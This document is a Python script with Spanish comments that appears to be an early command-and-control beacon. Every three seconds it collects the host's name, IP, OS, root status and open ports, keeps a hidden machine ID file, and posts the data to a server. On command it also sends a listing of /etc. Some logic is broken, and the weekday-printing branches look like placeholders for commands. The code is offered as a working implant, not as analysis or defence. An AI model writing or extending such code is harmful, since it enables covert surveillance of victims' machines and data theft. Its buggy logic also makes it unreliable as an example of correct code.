
import requests
import json
import os
import socket
import platform
from datetime import datetime
from apscheduler.schedulers.blocking import BlockingScheduler

os.system('pip install cryptography')
os.system('pip install apscheduler')

#omando_ejecutar = loquevenga

sched = BlockingScheduler()


@sched.scheduled_job('interval', seconds=3)
def timed_job():

    import requests
    import json
    import os
    import socket
    import platform
    from datetime import datetime
    from apscheduler.schedulers.blocking import BlockingScheduler

    if os.geteuid() != 0:
        root = "False"

    else:
        root = "True"

    def ls():
        ejemplo_dir = '/etc'
        global ficheros

        with os.scandir(ejemplo_dir) as ficheros:

            ficheros = [fichero.name for fichero in ficheros]

    # ARCHIVO PARA IDENTIFICACIÓN

    if os.path.exists('.id.txt'):
        with open(".id.txt", "r") as archivo:
            for linea in archivo:
                id_equipo = linea

    else:

        file = open(".id.txt", "w")

        # current date and time
        now = datetime.now()

        timestamp = datetime.timestamp(now)
        id = str((timestamp))

        nombre_equipo = socket.gethostname()

        id_equipo = id + nombre_equipo

        file.write(id + nombre_equipo)
        file.close()

    # DIRECCIÓN IP

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    print(s.getsockname()[0])

    # NOMBRE EQUIPO
    nombre_equipo = socket.gethostname()

    # DIRECCIÓN IP
    direccion_equipo = s.getsockname()[0]

    # VERSIÓN SO
    sistema = platform.platform()

    import socket
    lista = []

    for port in range(0, 9999):

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = s.connect_ex(("localhost", port))

    if result == 0:
        lista.append(port)

    s.close()

    puertos_a = ", ".join(map(str, (lista)))

    print(puertos_a)

    # Primero enviado

    url = "http://127.0.0.1"
    datos = {'nombre': nombre_equipo, 'IP': direccion_equipo, 'SO': sistema,
             'Puertos': puertos_a, 'id': id_equipo, 'root': root}  # <- El json que enviamos

    respuesta = requests.post(url, data=datos)

    # Ahora decodificamos la respuesta como json
    como_json = respuesta

    print("La respuesta del servidor es:")

    #print (vars(como_json))

    opcion = (como_json._content)
    listado = ""

    if opcion == b'1':

        # Segundo envio

        ejemplo_dir = '/etc'
        with os.scandir(ejemplo_dir) as ficheros:

            ficheros = [fichero.name for fichero in ficheros]
            listado = ", ".join(map(str, (ficheros)))

    # print(cls)

    datos = {'nombre': nombre_equipo, 'IP': direccion_equipo, 'SO': sistema,
             'Puertos': puertos_a, 'id': id_equipo, 'root': root, 'ls': listado}  # <- El json que enviamos

    respuesta = requests.post(url, data=datos)

    if opcion == 2:
        print('martes')
    if opcion == 3:
        print('miércoles')
    if opcion == 4:
        print('jueves')
    if opcion == 5:
        print('viernes')
    if opcion == 6:
        print('sábado')
    if opcion == 7:
        print('domingo')


sched.start()
